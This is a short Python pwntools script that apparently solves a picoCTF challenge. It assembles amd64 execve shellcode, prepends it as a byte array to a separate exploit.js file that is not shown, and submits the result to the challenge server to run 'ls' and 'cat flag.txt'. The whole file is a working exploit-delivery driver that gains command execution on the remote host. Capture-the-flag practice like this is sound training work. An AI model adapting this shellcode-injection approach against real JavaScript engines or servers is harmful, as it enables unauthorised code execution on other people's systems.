from pwn import *

context.arch = 'amd64'


def run(argv):
    exploit = open('exploit.js', 'r').read()

    header = 'let shellcode = '
    sc = shellcraft.amd64.linux.execve(argv[0], argv, 0)
    header += str(list(asm(sc)))
    header += ';\n'

    exploit = header + exploit
    exploit = exploit.encode()

    r = remote('mercury.picoctf.net', 24306)

    r.recvuntil(b'Provide size. Must be < 5k:')
    r.sendline(str(len(exploit)).encode())
    r.recvuntil(b'Provide script please!!\n')
    r.sendline(exploit)
    r.recvuntil(b'Run Complete')
    return r.recvall().decode()

x = run(['/bin/ls'])
if 'flag.txt' not in x:
    log.error("Something went wrong, retry the exploit.")
print(x)
x = run(['/bin/cat', 'flag.txt'])
if 'picoCTF' not in x:
    log.error("Something went wrong, retry the exploit.")
print(x)
